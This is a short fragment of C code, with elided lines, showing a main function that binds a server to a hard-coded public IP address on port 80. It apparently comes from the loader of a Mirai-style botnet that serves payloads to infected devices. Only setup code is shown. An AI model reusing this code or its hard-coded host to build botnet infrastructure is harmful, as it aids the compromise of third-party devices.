...
int main(int argc, char **args)
{
    ...
    addrs[0] = inet_addr("178.128.154.119"); // Address to bind to
    ...
    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "178.128.154.119", 80, "178.128.154.119")) == NULL)
    {
